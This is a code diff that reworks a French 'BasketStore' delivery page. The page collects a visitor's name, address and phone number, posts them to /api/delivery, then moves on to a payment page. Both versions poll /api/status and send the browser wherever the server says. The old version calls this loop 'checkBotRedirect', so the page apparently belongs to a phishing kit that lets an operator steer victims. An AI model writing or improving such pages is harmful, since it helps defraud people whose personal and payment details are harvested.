@@ -1,53 +1,70 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1.0" />
-<title>Livraison - BasketStore</title>
-<style>
-  body{font-family:Arial;text-align:center;padding:40px;}
-  input{display:block;margin:10px auto;padding:10px;width:80%;font-size:1em;}
-  button{padding:15px 25px;border-radius:10px;font-size:1.1em;cursor:pointer;background:#28a745;color:white;border:none;}
-  button:hover{background:#1e7e34;}
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Livraison - BasketStore</title>
+  <style>
+    body { font-family: Arial; text-align: center; padding: 40px; }
+    input {
+      display: block;
+      margin: 10px auto;
+      padding: 10px;
+      width: 250px;
+      border-radius: 8px;
+      border: 1px solid #ccc;
+    }
+    button {
+      background: #007bff; color: white; border: none; padding: 12px 25px;
+      border-radius: 8px; cursor: pointer;
+    }
+    button:hover { background: #0056b3; }
+  </style>
 </head>
 <body>
   <h1>📦 Informations de livraison</h1>
-  <input type="text" id="nom" placeholder="Nom">
-  <input type="text" id="prenom" placeholder="Prénom">
-  <input type="text" id="adresse" placeholder="Adresse">
-  <input type="text" id="telephone" placeholder="Téléphone">
-  <button id="goPayment">Continuer vers Paiement</button>
+  <form id="deliveryForm">
+    <input type="text" id="nom" placeholder="Nom" required>
+    <input type="text" id="prenom" placeholder="Prénom" required>
+    <input type="text" id="adresse" placeholder="Adresse" required>
+    <input type="text" id="telephone" placeholder="Téléphone" required>
+    <button type="submit">Continuer vers paiement</button>
+  </form>
 
   <script>
-    document.getElementById('goPayment').addEventListener('click', async ()=>{
+    document.getElementById('deliveryForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
       const data = {
-        nom: document.getElementById('nom').value,
-        prenom: document.getElementById('prenom').value,
-        adresse: document.getElementById('adresse').value,
-        telephone: document.getElementById('telephone').value
+        nom: nom.value, prenom: prenom.value,
+        adresse: adresse.value, telephone: telephone.value
       };
-      try{
-        await fetch('/api/delivery',{
-          method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body: JSON.stringify(data)
-        });
-      }catch(e){console.error(e);}
-      // Redirection frontend vers paiement
+      await fetch('/api/delivery', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      });
       window.location.href = '/payment.html';
     });
 
-    async function checkBotRedirect() {
+    let checking = false, lastRedirect = null;
+    async function checkStatus() {
+      if (checking) return;
+      checking = true;
       try {
-        const res = await fetch('/api/status');
+        const res = await fetch('/api/status', { cache: 'no-store' });
         const data = await res.json();
-        if(data.redirect && window.location.pathname !== data.redirect){
+        if (data.redirect && data.redirect !== lastRedirect) {
+          lastRedirect = data.redirect;
           window.location.href = data.redirect;
-        }else{setTimeout(checkBotRedirect,2000);}
-      }catch(e){setTimeout(checkBotRedirect,2000);}
+          return;
+        }
+      } catch {}
+      finally {
+        checking = false;
+        setTimeout(checkStatus, 2500);
+      }
     }
-    checkBotRedirect();
+    checkStatus();
   </script>
 </body>
 </html>
